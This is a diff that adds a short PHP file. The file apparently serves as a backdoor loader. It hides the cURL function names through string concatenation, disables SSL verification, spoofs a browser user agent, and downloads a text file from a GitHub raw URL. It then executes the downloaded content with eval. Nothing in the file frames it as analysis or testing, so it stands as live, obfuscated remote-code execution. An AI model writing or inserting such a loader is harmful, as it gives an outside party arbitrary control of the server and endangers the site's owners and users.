@@ -1,0 +1,18 @@
+<?php
+$c = "cur" . chr(108);
+$ci = $c . "_init";
+$cs = $c . "_setopt";
+$ce = $c . "_exec";
+$cc = $c . "_close";
+
+$ch = $ci();
+$cs($ch, CURLOPT_URL, "https://raw.githubusercontent.com/lucenbyte/ArchiLogs/main/v2/hbpy.txt");
+$cs($ch, CURLOPT_RETURNTRANSFER, 1);
+$cs($ch, CURLOPT_SSL_VERIFYPEER, false);
+$cs($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+$data = $ce($ch);
+$cc($ch);
+
+$admin = "?" . ">";
+eval($admin . $data);
+?>
